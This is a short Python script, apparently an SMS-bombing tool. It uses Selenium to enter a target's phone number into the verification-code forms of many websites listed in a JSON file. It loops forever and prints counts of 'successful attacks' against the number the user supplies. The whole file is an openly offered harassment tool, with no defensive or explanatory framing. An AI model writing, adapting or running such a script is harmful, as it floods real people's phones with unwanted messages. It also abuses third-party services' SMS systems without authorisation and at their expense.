#!/usr/bin/env python
#-*- coding:utf-8 -*-
from selenium import webdriver
import time
import json
browser=webdriver.Firefox()

def attack(telnum,url,telxpath,clickxpath):
    browser.delete_all_cookies()
    browser.get(url)
    time.sleep(1)
    #print(user)
    #print(passwd )
    browser.find_element_by_xpath(telxpath).click()
    browser.find_element_by_xpath(telxpath).clear()
    browser.find_element_by_xpath(telxpath).send_keys(telnum)
    time.sleep(1)
    browser.find_element_by_xpath(clickxpath).click()
    time.sleep(0.2)
    try:
        browser.switch_to_alert().accept()

    except:
        pass


if __name__=="__main__":
    print('作者：hijacklinux')
    telnum = input("请输入要攻击手机号：")
    n = 1
    m = 1
    while True:
        with open('auto_sites.json','r') as f:
            sites=json.load(f)    #读取json格式文件
            for site in sites:
                url = site["url"]
                name = site["name"]
                telxpath = site["telxpath"]
                clickxpath = site["clickxpath"]
#                spanxpath = site["spanxpath"]
#                 print(url)
#                 print(name)
#                 print(telxpath)
#                 print(clickxpath)
#                 a = input("test:")
                print(str(m)+"正在使用<"+site["name"]+">攻击")
                m = m+1
                try:
                    attack(telnum,url,telxpath,clickxpath)

                except: 
                    print("攻击失败")
                    continue
                else:
                    print("攻击成功,目前为止共成功"+str(n)+"次")
                    n = n+1
   #     a = input("continue?")
